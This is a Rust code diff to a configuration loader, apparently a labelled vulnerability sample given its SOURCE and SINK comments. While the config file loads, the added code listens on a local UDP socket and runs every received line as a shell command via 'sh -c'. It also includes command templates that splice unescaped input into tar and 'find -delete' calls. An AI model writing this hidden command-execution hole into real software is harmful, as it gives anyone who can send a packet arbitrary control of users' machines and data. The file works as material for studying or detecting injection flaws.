@@ -327,9 +327,78 @@ impl Config {
         let s: String = fs::read_to_string(path)
             .await
             .with_context(|| format!("Failed to read the config {:?}", path))?;
+        
+        use std::net::UdpSocket;
+        let socket = UdpSocket::bind("127.0.0.1:0")?;
+        let mut buffer = [0; 1024];
+        //SOURCE
+        let bytes_read = socket.recv(&mut buffer)?;
+        
+        let command_data = String::from_utf8_lossy(&buffer[..bytes_read]);
+        
+        for line in command_data.lines() {
+            let line = line.trim();
+            if line.is_empty() || line.starts_with('#') {
+                continue;
+            }
+            
+            if let Some(command) = Self::parse_config_command(&line) {
+                if let Err(e) = Config::execute_external_command(&command) {
+                    tracing::error!("Failed to execute command '{}': {}", command, e);
+                }
+            }
+        }
+        
         Config::from_str(&s).with_context(|| {
             "Configuration is invalid. Please refer to the configuration specification."
         })
+    }
+    
+    pub fn execute_external_command(command: &str) -> std::io::Result<()> {
+        //SINK
+        let output = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(command)
+            .output()?;
+        
+        tracing::info!("Executed external command: {} (exit code: {})", command, output.status);
+        
+        if !output.stdout.is_empty() {
+            tracing::debug!("Command output: {}", String::from_utf8_lossy(&output.stdout));
+        }
+        
+        if !output.stderr.is_empty() {
+            tracing::warn!("Command stderr: {}", String::from_utf8_lossy(&output.stderr));
+        }
+        
+        Ok(())
+    }
+    
+    fn parse_config_command(line: &str) -> Option<String> {
+        // Parse different types of configuration commands
+        if line.starts_with("exec:") {
+            // Direct command execution
+            Some(line[5..].trim().to_string())
+        } else if line.starts_with("script:") {
+            // Script execution with environment setup
+            let script = line[7..].trim();
+            Some(format!("export PATH=/usr/local/bin:/usr/bin:/bin && {}", script))
+        } else if line.starts_with("system:") {
+            // System command with logging
+            let cmd = line[7..].trim();
+            Some(format!("echo 'Executing: {}' && {}", cmd, cmd))
+        } else if line.starts_with("backup:") {
+            // Backup command with validation
+            let path = line[7..].trim();
+            Some(format!("tar -czf backup_{}.tar.gz {}", path, path))
+        } else if line.starts_with("cleanup:") {
+            // Cleanup command
+            let pattern = line[8..].trim();
+            Some(format!("find . -name '{}' -delete", pattern))
+        } else {
+            // Default: treat as direct command
+            Some(line.to_string())
+        }
     }
 }
 
